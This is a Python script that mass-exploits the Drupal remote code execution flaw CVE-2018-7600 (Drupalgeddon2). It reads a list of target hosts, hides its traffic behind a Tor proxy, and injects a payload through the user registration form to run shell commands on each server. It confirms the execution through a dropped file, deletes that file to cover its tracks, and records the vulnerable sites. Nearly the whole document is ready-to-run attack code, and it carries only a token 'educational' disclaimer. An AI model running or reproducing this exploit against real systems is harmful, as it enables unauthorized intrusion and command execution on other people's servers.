#!/usr/bin/env python3
from random import sample
from sys import version_info
from string import ascii_lowercase
from readline import parse_and_bind
from requests import session, Timeout
from requests import ConnectionError as SessionConnectionError

info = '\033[1;33m[!]\033[1;m '
que = '\033[1;34m[?]\033[1;m '
bad = '\033[1;31m[-]\033[1;m '
good = '\033[1;32m[+]\033[1;m '

# Config:
cleanup = True  # Automated Cleanup
write_file = True  # Write exploitable targets to file
tor_proxy = True  # Uses Tor network

# Creates random file name
random_file_name = ''.join(sample(ascii_lowercase, 5)) + ".txt"
# Bash payload for creating user file
bash_command = "echo Name: $(id -un) UID: $(id -u) Groups: $(id -Gn) | tee %s" % random_file_name
# Bash payload for deleting
rm_command = "rm %s" % random_file_name


# Tor session
def session_setup():
    try:
        requests_session = session()
        if tor_proxy:
            import socks
            requests_session.proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
        return requests_session
    except ImportError:
        print(
            bad +
            "Error importing socks to to Tor, make sure to `pip3 install pysocks`"
        )
        exit(1)


def whats_my_ip(session):
    your_ip = session.get("http://httpbin.org/ip").json()["origin"]
    print(good + "Your IP: " + your_ip)


def cleanup_url(target):
    target = target.strip()

    if not target.startswith('http'):
        target = "http://" + target

    if not target.endswith('/'):
        target = target + '/'

    return target


def is_website_up(website, session):
    try:
        response = session.get(website, timeout=5)
        return (response.status_code == 200)
    except Timeout:
        print(bad + website + " is down")
        return False


def drupal_version(website, session):
    response = session.get(website)
    try:
        version = response.headers["X-Generator"].replace(
            " (https://www.drupal.org)", "")
        print(good + "Drupal Version: " + version)
        return version
    except KeyError:
        print(bad + "Drupal Version: Not Detected")
        return None


def generate_payload(command):
    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': command
    }
    return payload


def send_payload(target, payload, session):
    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    return session.post(url, data=payload)


def send_command(target, command, session):
    return send_payload(target, generate_payload(command), session)


def check_if_file_created(target, file_name, session):
    url = target + file_name
    print(good + 'Checking... ' + url)
    file_response = session.get(url)
    if file_response.status_code != 404:
        print(good + 'File successfully created:')
        print(' ' * 4 + file_response.text.strip())
        cleanup_file(target, file_name, session)
        return True
    else:
        print(bad + target + ' File creation unsuccessful')
        return False


def cleanup_file(target, file_name, session):
    url = target + file_name
    if cleanup:
        print(good + "Deleting... " + url)
        send_command(target, rm_command, session)


def cve_2018_7600(target, session):
    r = send_command(target, bash_command, session)
    if r.status_code == 200:
        print(good + target + ' Possibly exploitable')
        return check_if_file_created(target, random_file_name, session)
    else:
        print(bad + target + ' Not exploitable')
        return False


def exploit_from_file(file_name, session):
    vulnerable_sites = []
    with open(file_name) as file:
        for target in file:
            target = cleanup_url(target)
            if is_website_up(target, session):
                drupal_version(target, session)
                if cve_2018_7600(target, session):
                    vulnerable_sites.append(target)
    return vulnerable_sites


def write_to_file(vulnerable_sites):
    with open("exploitable", "w") as file:
        for site in vulnerable_sites:
            file.write(site)


if __name__ == '__main__':
    try:
        print(info +
              'Provided only for educational or information purposes.'.upper())
        parse_and_bind('tab: complete')
        if version_info.major == 3:
            file_name = str(
                input(
                    que + 'Enter file name (example: /root/file/hosts.txt): '))
        else:
            file_name = raw_input(
                que + 'Enter file name (example: /root/file/hosts.txt): ')
        requests_session = session_setup()
        whats_my_ip(requests_session)
        exploit_from_file = exploit_from_file(file_name, requests_session)
        if write_file:
            write_to_file(exploit_from_file)
    except KeyboardInterrupt:
        print(bad + "Exiting...")
        exit(0)
    except SessionConnectionError:
        print(
            bad + "Error connection to Tor, start Tor or disable `tor_proxy`")
        exit(1)
